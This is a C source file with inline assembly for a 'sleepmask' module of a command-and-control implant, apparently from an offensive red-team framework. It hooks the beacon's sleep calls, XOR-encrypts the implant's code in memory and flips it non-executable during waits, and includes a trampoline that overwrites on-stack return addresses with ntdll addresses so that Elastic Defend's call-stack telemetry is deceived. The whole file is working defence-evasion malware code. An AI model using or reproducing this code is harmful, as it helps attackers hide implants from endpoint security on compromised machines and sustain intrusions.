/* sleepmask BOF — encrypted sleepmask (P2).
 *
 * Intercepts Sleep/WFSO/WFMO via BeaconGate. On a sleep where the beacon is
 * quiescent (SleepObf enabled, no BOF jobs running), XOR-encrypts the beacon's
 * PIC code region in place with a per-sleep random key, flips it to
 * PAGE_READWRITE (non-executable) for the wait, then symmetrically XORs-back
 * with the SAME key and restores PAGE_EXECUTE_READ on wake. A memory scanner
 * therefore sees only ciphertext (on a non-exec page) during the sleep window.
 *
 * Restore is symmetric XOR-back (the key lives on this BOF's stack across the
 * blocking wait; the BOF runs in a separate module-stomped DLL region, so its
 * stack survives) — it does NOT depend on SmInfo->CleanTextBuf, which the
 * loader-written stomp tag only populates in the UDRL PIC blob (NULL in the
 * CRT-linked debug EXE used for testing).
 *
 * Guard: encrypt only when SmInfo->Config.SleepObf && SmInfo->ActiveJobCount==0.
 * ActiveJobCount>0 means a worker thread is inside a BOF that may call back
 * into beacon .text — encrypting it would crash that thread, so we fall back
 * to a plain wait.
 *
 * No bare libc: per-byte/per-field init only (no aggregate-init that gcc would
 * lower to a memset call — see bof-builder LESSONS U2). Compiled at -O0 so the
 * rolling XOR loop is not pattern-matched into memset/memcpy. */

#include "Imports.h"
#include "Gate.h"
#include <stddef.h>

/* ========= [ P4: SpoofedVirtualProtect trampoline ] =========
 *
 * Spoofs the kernel call stack captured at the sleepmask VirtualProtect
 * syscall event. The beacon is module-stomped: its .text is image-backed by
 * address range but private copy-on-write at the page level (stomp write +
 * sleepmask writes), so Elastic Defend (kernel-resident Threat-Intelligence
 * ETW, page-level QueryWorkingSetEx backing) sees every beacon frame on the
 * VP call stack as unbacked (call_stack_contains_unbacked, per-frame
 * allocation_private_bytes>0). This trampoline rewrites the *on-stack*
 * return addresses of the live RBP frame chain with image-backed ntdll
 * addresses for the duration of the VP syscall, then restores them, so the
 * kernel walker reads image-backed (private=0) frames. Real execution is
 * untouched: the real return addresses are written back before SmEncrypt
 * unwinds.
 *
 * Mechanism (ThreadStackSpoofer / mrtiz gadget-only style):
 *   - Walk the RBP frame chain from SmEncrypt's frame (rbp is non-volatile,
 *     SmEncrypt set it) up to NaxMain. For each [rbp+8] return address that is
 *     NOT inside ntdll (i.e. a private beacon/BOF address), save the real
 *     value and overwrite the slot with the StackFiller (an ntdll .text addr).
 *     Stop at the first ntdll frame (image-backed already) or an
 *     out-of-range/misaligned rbp (TEB StackBase/Limit bounds).
 *   - Set rbx = restore label, push the JmpRbxGadget (a `jmp rbx` / FF E3 in
 *     ntdll .text) as VP's immediate return address, then tail-jmp to the real
 *     kernel32!VirtualProtect (VpPtr). VP's `ret` pops the gadget and executes
 *     `jmp rbx`, transferring to the restore label. At the syscall instant
 *     the trampoline's own code is not executing, so its private RIP is never
 *     a captured frame IP; the only frames the walker reads above VP are the
 *     spoofed ntdll slots.
 *   - Restore: re-walk the (intact) chain writing the saved real return
 *     addresses back, restore rbx, ret to SmEncrypt. rax holds VP's BOOL
 *     return throughout (restore never touches rax).
 *
 * Fallback: if Sm is NULL, SpoofReady==0, or VpPtr is unresolved (defender
 * lane where the beacon compiled out the P4 block), the trampoline tail-jmps
 * the BOF's own __imp_KERNEL32$VirtualProtect import with no spoofing -
 * exactly the pre-P4 behavior. The beacon never crashes due to spoofing.
 *
 * PIC / ABI: no .refptr/GOT (all addresses come from the Sm struct in rax or
 * rip-relative locals; the restore label is reached via rbx, not a GOT
 * pointer). No .pdata/.xdata touched (return addresses live on the stack, not
 * in unwind info). Compiled into the single BOF .o as a naked function
 * (x86_64-mingw gcc 15 supports naked on x64). */

/* NAX_SM_INFO field byte offsets used by the trampoline. Kept in sync with
 * both Gate.h copies via the _Static_asserts below - silent struct-layout
 * drift would corrupt the spoof. */
#define SM_OFF_VpPtr        0x38
#define SM_OFF_JmpRbxGadget 0x40
#define SM_OFF_StackFiller  0x48
#define SM_OFF_NtdllBase    0x50
#define SM_OFF_NtdllSize    0x58
#define SM_OFF_SpoofReady   0x60
#define SM_OFF_SpoofCount   0x64

_Static_assert( offsetof(NAX_SM_INFO, VpPtr)        == SM_OFF_VpPtr,        "SmInfo VpPtr offset" );
_Static_assert( offsetof(NAX_SM_INFO, JmpRbxGadget) == SM_OFF_JmpRbxGadget, "SmInfo JmpRbxGadget offset" );
_Static_assert( offsetof(NAX_SM_INFO, StackFiller)  == SM_OFF_StackFiller,  "SmInfo StackFiller offset" );
_Static_assert( offsetof(NAX_SM_INFO, NtdllBase)    == SM_OFF_NtdllBase,    "SmInfo NtdllBase offset" );
_Static_assert( offsetof(NAX_SM_INFO, NtdllSize)    == SM_OFF_NtdllSize,    "SmInfo NtdllSize offset" );
_Static_assert( offsetof(NAX_SM_INFO, SpoofReady)   == SM_OFF_SpoofReady,   "SmInfo SpoofReady offset" );
_Static_assert( offsetof(NAX_SM_INFO, SpoofCount)   == SM_OFF_SpoofCount,   "SmInfo SpoofCount offset" );

/* SpoofedVirtualProtect(Sm, lpAddress, dwSize, flNewProtect, lpflOldProtect)
 * Win64: rcx=Sm, rdx=addr, r8=size, r9=newProt, [rsp+0x28]=oldOut. Returns
 * the BOOL from VirtualProtect in rax. Naked: no prologue/epilogue of its own;
 * it manages the stack frame by hand. */
__attribute__((naked))
static BOOL SpoofedVirtualProtect( PNAX_SM_INFO Sm, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect )
{
    __asm__ __volatile__(
    ".intel_syntax noprefix\n"
    /* entry: rcx=Sm, rdx=addr, r8=size, r9=newProt, [rsp+0x28]=oldOut ; rsp=X */
    "  mov rax, rcx\n"                     /* rax = Sm */
    "  test rax, rax\n"
    "  jz .Lsvp_direct\n"                  /* no Sm -> direct VP */
    "  mov r10d, [rax+0x60]\n"             /* SpoofReady */
    "  test r10d, r10d\n"
    "  jz .Lsvp_direct\n"                  /* spoof disabled -> direct VP */
    /* ---- spoof path: remap VP args, build frame ---- */
    "  mov rcx, rdx\n"                     /* rcx = addr  (VP arg0) */
    "  mov rdx, r8\n"                      /* rdx = size (VP arg1) */
    "  mov r8,  r9\n"                      /* r8  = newProt (VP arg2) */
    "  mov r9,  [rsp+0x28]\n"              /* r9  = oldOut (VP arg3, entry rsp+0x28) */
    "  push rbx\n"
    "  push rsi\n"
    "  push rdi\n"
    "  push r12\n"
    "  push rbp\n"                         /* save SmEncrypt's rbp (non-volatile) ; 5 pushes */
    "  sub rsp, 0x90\n"                    /* rsp0 = X-184 ; 16-aligned (5 pushes + 0x90) */
    /* frame (rsp0-relative): [0x00..0x18] shadow, [0x20..0x38] VP args,
       [0x40..0x78] retsave[0..7], [0x80] start_rbp, [0x88] count */
    "  mov [rsp+0x20], rcx\n"              /* save addr */
    "  mov [rsp+0x28], rdx\n"              /* save size */
    "  mov [rsp+0x30], r8\n"               /* save newProt */
    "  mov [rsp+0x38], r9\n"               /* save oldOut */
    "  mov rbx, [rax+0x50]\n"              /* rbx = NtdllBase (stable across walk) */
    "  mov rsi, gs:[0x10]\n"               /* StackLimit  (low bound) */
    "  mov rdi, gs:[0x08]\n"               /* StackBase   (high bound) */
    "  mov [rsp+0x80], rbp\n"              /* start_rbp = SmEncrypt frame */
    "  xor r12, r12\n"                     /* count = 0 ; rbp already = SmEncrypt frame */
    ".Lsvp_walk:\n"
    "  cmp rbp, rsi\n"
    "  jb  .Lsvp_walk_done\n"              /* rbp < StackLimit -> out */
    "  cmp rbp, rdi\n"
    "  jae .Lsvp_walk_done\n"              /* rbp >= StackBase -> out */
    "  test rbp, 7\n"
    "  jnz .Lsvp_walk_done\n"              /* misaligned saved rbp -> out */
    "  mov rcx, [rbp+8]\n"                 /* this frame's return address */
    "  mov r8,  rbx\n"                     /* NtdllBase */
    "  mov r9,  [rax+0x58]\n"              /* NtdllSize */
    "  add r9,  r8\n"                      /* NtdllEnd */
    "  cmp rcx, r8\n"
    "  jb  .Lsvp_spoof\n"                  /* ret < ntdll base -> private, spoof */
    "  cmp rcx, r9\n"
    "  jae .Lsvp_spoof\n"                  /* ret >= ntdll end -> private, spoof */
    "  jmp .Lsvp_walk_done\n"              /* ret in ntdll -> image-backed, stop */
    ".Lsvp_spoof:\n"
    "  mov [rsp + r12*8 + 0x40], rcx\n"    /* retsave[count] = real return addr */
    "  inc r12\n"
    "  mov rdx, [rax+0x48]\n"              /* StackFiller (ntdll .text addr) */
    "  mov [rbp+8], rdx\n"                 /* overwrite return slot with filler */
    "  cmp r12, 8\n"
    "  jae .Lsvp_walk_done\n"              /* cap at 8 frames */
    "  mov rbp, [rbp]\n"                   /* next frame (caller's saved rbp) */
    "  jmp .Lsvp_walk\n"
    ".Lsvp_walk_done:\n"
    "  mov [rsp+0x88], r12\n"              /* count */
    "  inc dword ptr [rax+0x64]\n"         /* Sm->SpoofCount++ (rax still = Sm; per-cycle spoof diagnostic) */
    /* set rbx = restore label, reload VP args + gadget + VpPtr, push gadget, jmp VP */
    "  lea rbx, [rip+.Lsvp_restore]\n"
    "  mov rcx, [rsp+0x20]\n"             /* addr */
    "  mov rdx, [rsp+0x28]\n"             /* size */
    "  mov r8,  [rsp+0x30]\n"             /* newProt */
    "  mov r9,  [rsp+0x38]\n"             /* oldOut */
    "  mov r10, [rax+0x40]\n"             /* JmpRbxGadget (FF E3) -- VP's return addr */
    "  mov r11, [rax+0x38]\n"             /* VpPtr -- real kernel32!VirtualProtect */
    "  push r10\n"                         /* [rsp0-8] = gadget ; rsp = rsp0-8 (8 mod 16) */
    "  jmp r11\n"                          /* tail-call VP. VP ret -> gadget -> jmp rbx -> restore */
    ".Lsvp_restore:\n"
    /* rsp = rsp0 (VP popped gadget). rax = VP's BOOL return (untouched below). */
    "  mov r12, [rsp+0x88]\n"             /* count */
    "  mov rbp, [rsp+0x80]\n"             /* start_rbp = SmEncrypt frame */
    "  xor r11, r11\n"                    /* index */
    "  test r12, r12\n"
    "  jz .Lsvp_rest_done\n"
    ".Lsvp_rest_loop:\n"
    "  mov rcx, [rsp + r11*8 + 0x40]\n"   /* retsave[i] (real return addr) */
    "  mov [rbp+8], rcx\n"                /* write back to its slot */
    "  mov rbp, [rbp]\n"                  /* next frame (saved-rbp links intact) */
    "  inc r11\n"
    "  cmp r11, r12\n"
    "  jb .Lsvp_rest_loop\n"
    ".Lsvp_rest_done:\n"
    "  add rsp, 0x90\n"
    "  pop rbp\n"
    "  pop r12\n"
    "  pop rdi\n"
    "  pop rsi\n"
    "  pop rbx\n"
    "  ret\n"                             /* pops [X] -> SmEncrypt ; rax = VP BOOL */
    /* ---- direct fallback (SpoofReady==0 / Sm==NULL / VpPtr unresolved) ---- */
    ".Lsvp_direct:\n"
    /* rcx(=rax)=Sm, rdx=addr, r8=size, r9=newProt, [rsp+0x28]=oldOut ; entry rsp=X, no frame */
    "  test rax, rax\n"
    "  jz .Lsvp_vp_import\n"               /* Sm==NULL -> BOF import */
    "  mov r10, [rax+0x38]\n"             /* VpPtr */
    "  test r10, r10\n"
    "  jz .Lsvp_vp_import\n"               /* VpPtr unresolved -> BOF import */
    "  mov rcx, rdx\n"                     /* addr */
    "  mov rdx, r8\n"                      /* size */
    "  mov r8,  r9\n"                      /* newProt */
    "  mov r9,  [rsp+0x28]\n"             /* oldOut */
    "  jmp r10\n"                          /* tail-call real VP, no spoof */
    ".Lsvp_vp_import:\n"
    "  mov rcx, rdx\n"                     /* addr */
    "  mov rdx, r8\n"                      /* size */
    "  mov r8,  r9\n"                      /* newProt */
    "  mov r9,  [rsp+0x28]\n"             /* oldOut */
    "  jmp qword ptr [rip+__imp_KERNEL32$VirtualProtect]\n"  /* BOF import fallback */
    ".att_syntax\n"
    );
}

/* ========= [ encrypt context - held on the handler stack across the wait ] ========= */

typedef struct _SM_CTX {
    BYTE   Key[ NAX_SM_KEY_LEN ];
    DWORD  OldProtect;
    BOOL   Encrypted;
} SM_CTX, *PSM_CTX;

/* ========= [ helpers ] ========= */

/* TRUE if this sleep should encrypt the beacon region. */
static BOOL SmShouldEncrypt( PNAX_SM_INFO Sm ) {
    if ( ! Sm )                              return FALSE;
    if ( ! Sm->Config.SleepObf )             return FALSE;
    if ( Sm->ActiveJobCount != 0 )          return FALSE;
    if ( ! Sm->BeaconBase || ! Sm->BeaconSize ) return FALSE;
    return TRUE;
}

/* Fallback key if BCryptGenRandom is unavailable: derive 16 non-zero bytes
 * from the SmInfo pointer + the region base (deterministic per-sleep-ish,
 * non-zero — encryption still runs, just weaker entropy). */
static void SmDeriveKey( PNAX_SM_INFO Sm, PBYTE Key ) {
    ULONG_PTR s = (ULONG_PTR)Sm ^ (ULONG_PTR)Sm->BeaconBase;
    for ( UINT32 i = 0; i < NAX_SM_KEY_LEN; i++ ) {
        s = s * 1103515245u + 12345u;
        Key[ i ] = (BYTE)( ( s >> 16 ) & 0xFF );
        if ( Key[ i ] == 0 ) Key[ i ] = 0x5A;
    }
}

/* Generate the per-sleep key. */
static void SmGenKey( PNAX_SM_INFO Sm, PBYTE Key ) {
    NTSTATUS s = BCryptGenRandom( NULL, Key, NAX_SM_KEY_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
    if ( s != 0 )
        SmDeriveKey( Sm, Key );
}

/* Rolling XOR over [Base, Base+Size) with the 16-byte key. Used for both
 * encrypt and decrypt (XOR is symmetric). */
static void SmXorRegion( PBYTE Base, UINT32 Size, const BYTE* Key ) {
    for ( UINT32 i = 0; i < Size; i++ )
        Base[ i ] ^= Key[ i & ( NAX_SM_KEY_LEN - 1 ) ];
}

/* Encrypt the beacon region. Ctx->Encrypted is set TRUE only if the full
 * sequence succeeded (so SmDecrypt knows whether to undo it). */
static void SmEncrypt( PNAX_SM_INFO Sm, PSM_CTX Ctx ) {
    Ctx->Encrypted = FALSE;

    SmGenKey( Sm, Ctx->Key );

    DWORD old = 0;
    if ( ! SpoofedVirtualProtect( Sm, Sm->BeaconBase, (SIZE_T)Sm->BeaconSize, PAGE_READWRITE, &old ) ) {
#ifdef DEBUG
        printf( "[sleepmask] encrypt: VirtualProtect RW failed - skipping\n" );
#endif
        return;
    }
    Ctx->OldProtect = old;

    SmXorRegion( (PBYTE)Sm->BeaconBase, Sm->BeaconSize, Ctx->Key );
    Ctx->Encrypted = TRUE;   /* region stays PAGE_READWRITE for the sleep */

#ifdef DEBUG
    printf( "[sleepmask] encrypt: base=%p size=0x%x key=%02x%02x%02x%02x%02x%02x%02x%02x old=0x%lx\n",
            Sm->BeaconBase, Sm->BeaconSize,
            Ctx->Key[0], Ctx->Key[1], Ctx->Key[2], Ctx->Key[3],
            Ctx->Key[4], Ctx->Key[5], Ctx->Key[6], Ctx->Key[7],
            (unsigned long)Ctx->OldProtect );
#endif
}

/* Decrypt (XOR-back) and restore the original page protection. */
static void SmDecrypt( PNAX_SM_INFO Sm, PSM_CTX Ctx ) {
    if ( ! Ctx->Encrypted )
        return;

    SmXorRegion( (PBYTE)Sm->BeaconBase, Sm->BeaconSize, Ctx->Key );

    DWORD old = 0;
    SpoofedVirtualProtect( Sm, Sm->BeaconBase, (SIZE_T)Sm->BeaconSize, Ctx->OldProtect, &old );

#ifdef DEBUG
    printf( "[sleepmask] decrypt: base=%p size=0x%x restored=0x%lx\n",
            Sm->BeaconBase, Sm->BeaconSize, (unsigned long)Ctx->OldProtect );
#endif

    Ctx->Encrypted = FALSE;
}

/* ========= [ per-API handlers ] ========= */

static void HandleSleep( PFUNCTION_CALL FnCall ) {
    DWORD ms = (DWORD)FnCall->Args[0];
    PNAX_SM_INFO Sm = (PNAX_SM_INFO)FnCall->SmInfo;

#ifdef DEBUG
    printf( "[sleepmask] Sleep(%lu ms)\n", (unsigned long)ms );
#endif

    SM_CTX ctx;
    ctx.Encrypted = FALSE;
    BOOL enc = SmShouldEncrypt( Sm );
    if ( enc )
        SmEncrypt( Sm, &ctx );

    /* wait (PoC: dummy event + timed NtWaitForSingleObject) */
    HANDLE hEvent = NULL;
    NtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, 1, FALSE );
    if ( hEvent ) {
        LARGE_INTEGER timeout;
        timeout.QuadPart = -(LONGLONG)ms * 10000;
        NtWaitForSingleObject( hEvent, FALSE, &timeout );
        NtClose( hEvent );
    }

    if ( enc )
        SmDecrypt( Sm, &ctx );

#ifdef DEBUG
    /* P4 diagnostic: SpoofCount is incremented by the trampoline on every
     * spoofed VirtualProtect (SmEncrypt + SmDecrypt = +2 per sleep cycle when
     * SpoofReady). Stays 0 on the defender lane / when the gadget isn't found
     * -> the trampoline took the direct-VP fallback. Cumulative, so a steady
     * +2/cycle proves the spoof path is live and restoring the return chain. */
    printf( "[spoof] SpoofReady=%u SpoofCount=%lu\n",
            Sm->SpoofReady, (unsigned long)Sm->SpoofCount );
#endif
}

/* WFSO / WFMO are transport-internal waits (SMB named-pipe connect/read events,
 * and any future transport that blocks on a handle) that fire WHILE beacon .text
 * is mid-execution - the transport called WaitForSingleObject/MultipleObjects
 * and is blocked inside us. Encrypting beacon .text here would XOR code that the
 * transport thread is about to return into; even with a perfect XOR-back that is
 * a needless hazard, and these waits are short (transport-active, not dormant) so
 * there is no scanner-evasion value. Standard sleepmask encrypts only on the
 * deliberate Sleep. Forward these to the real API (FnCall->FunctionPtr, the
 * pre-swap original) untouched - exactly what the working PoC did. */
static void HandleWaitForSingleObject( PFUNCTION_CALL FnCall ) {
#ifdef DEBUG
    printf( "[sleepmask] WFSO(handle=%p ms=%lu) -> forward (no encrypt)\n",
            (HANDLE)FnCall->Args[0], (unsigned long)(DWORD)FnCall->Args[1] );
#endif
    FnCall->RetValue = ((FN2) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1] );
}

static void HandleWaitForMultipleObjects( PFUNCTION_CALL FnCall ) {
#ifdef DEBUG
    printf( "[sleepmask] WFMO(n=%lu waitAll=%d ms=%lu) -> forward (no encrypt)\n",
            (unsigned long)(DWORD)FnCall->Args[0],
            (int)(BOOL)FnCall->Args[2],
            (unsigned long)(DWORD)FnCall->Args[3] );
#endif
    FnCall->RetValue = ((FN4) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3] );
}

static void HandleVirtualProtect( PFUNCTION_CALL FnCall ) {
    LPVOID lpAddress      = (LPVOID)FnCall->Args[0];
    SIZE_T dwSize         = (SIZE_T)FnCall->Args[1];
    DWORD  flNewProtect   = (DWORD)FnCall->Args[2];
    PDWORD lpflOldProtect = (PDWORD)FnCall->Args[3];

    BOOL ret = VirtualProtect( lpAddress, dwSize, flNewProtect, lpflOldProtect );
    FnCall->RetValue = (ULONG_PTR)ret;
}

static void HandleGeneric( PFUNCTION_CALL FnCall ) {
    switch ( FnCall->NumArgs ) {
    case 0:  FnCall->RetValue = ((FN0) FnCall->FunctionPtr)(); break;
    case 1:  FnCall->RetValue = ((FN1) FnCall->FunctionPtr)( FnCall->Args[0] ); break;
    case 2:  FnCall->RetValue = ((FN2) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1] ); break;
    case 3:  FnCall->RetValue = ((FN3) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2] ); break;
    case 4:  FnCall->RetValue = ((FN4) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3] ); break;
    case 5:  FnCall->RetValue = ((FN5) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3], FnCall->Args[4] ); break;
    case 6:  FnCall->RetValue = ((FN6) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3], FnCall->Args[4], FnCall->Args[5] ); break;
    case 7:  FnCall->RetValue = ((FN7) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3], FnCall->Args[4], FnCall->Args[5], FnCall->Args[6] ); break;
    case 8:  FnCall->RetValue = ((FN8) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3], FnCall->Args[4], FnCall->Args[5], FnCall->Args[6], FnCall->Args[7] ); break;
    case 9:  FnCall->RetValue = ((FN9) FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3], FnCall->Args[4], FnCall->Args[5], FnCall->Args[6], FnCall->Args[7], FnCall->Args[8] ); break;
    case 10: FnCall->RetValue = ((FN10)FnCall->FunctionPtr)( FnCall->Args[0], FnCall->Args[1], FnCall->Args[2], FnCall->Args[3], FnCall->Args[4], FnCall->Args[5], FnCall->Args[6], FnCall->Args[7], FnCall->Args[8], FnCall->Args[9] ); break;
    }
}

/* ========= [ entry point ] ========= */

__attribute__((aligned(16)))
void sleep_mask( void* NaxPtr, PFUNCTION_CALL FnCall ) {
#ifdef DEBUG
    printf( "[sleepmask] GateApi=0x%02x NumArgs=%lu FunctionPtr=%p\n",
            FnCall->GateApi, (unsigned long)FnCall->NumArgs, FnCall->FunctionPtr );
#endif

    switch ( FnCall->GateApi ) {
    case GATE_API_SLEEP:                     HandleSleep( FnCall );                   return;
    case GATE_API_WAIT_FOR_SINGLE_OBJECT:    HandleWaitForSingleObject( FnCall );     return;
    case GATE_API_WAIT_FOR_MULTIPLE_OBJECTS: HandleWaitForMultipleObjects( FnCall );  return;
    case GATE_API_VIRTUAL_PROTECT:           HandleVirtualProtect( FnCall );          return;
    default:                                 HandleGeneric( FnCall );                 return;
    }
}